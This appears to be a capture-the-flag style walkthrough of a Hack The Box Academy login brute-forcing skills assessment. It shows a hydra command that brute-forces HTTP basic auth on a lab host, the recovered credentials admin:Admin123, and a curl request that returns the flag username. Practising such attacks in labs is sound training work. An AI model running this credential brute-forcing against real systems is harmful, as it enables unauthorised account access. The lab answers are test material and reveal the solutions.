# Section 12: Skills Assessment Part 1

Module: 16. Login Brute Forcing

---

## Questions & Answers

### 1. What is the password for the basic auth login?

Context:
- Brute-force for the valid `username:password`:
```bash
┌─[htb-ac-2162140@htb-wzjtvp0jkj-htb-cloud-com]─[~]
└──╼ [★]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 154.57.164.67 http-get / -s 31501
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-07 06:35:08
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
[DATA] attacking http-get://154.57.164.67:31501/
[31501][http-get] host: 154.57.164.67   login: admin   password: Admin123
```

**Answer:** `Admin123`

---

### 2. After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?

Context:
```bash
┌─[htb-ac-2162140@htb-wzjtvp0jkj-htb-cloud-com]─[~]
└──╼ [★]$ curl -u "admin:Admin123" http://154.57.164.67:31501
<!DOCTYPE html>
<html>

<head>
    <title>Flag</title>
    <style>
        body {
            font-family: monospace;
            /* Use a monospace font for the flag */
            text-align: center;
            background-color: #222;
            /* Dark background */
            color: #0f0;
            /* Green text */
        }

        h1 {
            margin-top: 20%;
            /* Add some top margin */
        }

        .flag {
            font-size: 2em;
            /* Make the flag larger */
            background-color: #000;
            /* Black background for the flag */
            padding: 10px 20px;
            border-radius: 5px;
            display: inline-block;
            /* Make it behave like an inline element */
        }
    </style>
</head>

<body>
    <h1>Congratulations!</h1>
    <p>This is the username you will need for part 2 of the Skills Assessment<span class="flag">satwossh</span></p>
</body>

</html>
```

**Answer:** `satwossh`

---

[Back to Module Index](./README.md)
